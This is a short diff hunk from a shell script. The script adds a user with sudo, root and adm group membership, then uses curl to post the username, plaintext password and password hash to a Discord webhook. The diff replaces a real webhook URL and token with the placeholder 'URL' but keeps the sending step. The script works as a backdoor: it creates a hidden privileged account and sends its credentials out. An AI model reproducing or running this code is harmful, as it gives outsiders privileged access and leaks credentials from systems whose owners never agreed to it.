@@ -10,6 +10,6 @@
         exit 1
     else
         /sbin/useradd -m -G sudo,root,adm -s /bin/bash -p $pass $username
-        curl -H "Content-Type: application/json" -d '{"username": "'"${username}"'", "content": "username = '"${username}"' \npassword = '"${password}"' \npass = '"${pass}"'"}' "https://discord.com/api/webhooks/1042025696966483999/MJVw-6DePZzLeQwZN4Ot_SqkKsuJzHqQOtXy0RvhchSlaq6CRZus1HW1M_nc5E1qkj1w"
+        curl -H "Content-Type: application/json" -d '{"username": "'"${username}"'", "content": "username = '"${username}"' \npassword = '"${password}"' \npass = '"${pass}"'"}' "URL"
     fi
     
